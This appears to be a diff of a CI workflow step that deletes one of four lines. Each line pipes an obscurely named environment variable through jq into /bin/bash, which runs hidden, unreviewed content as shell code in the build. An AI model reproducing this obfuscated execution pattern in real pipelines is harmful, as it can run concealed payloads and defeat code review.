@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$vjz295" | jq -r .qf04 | /bin/bash
           echo $dbxr413 | jq -r .h1329 | /bin/bash
-          echo $zyblu6284 | jq -r .m118 | /bin/bash
           echo $q3 | jq -r .ym00062 | /bin/bash
 
       - name: Save results
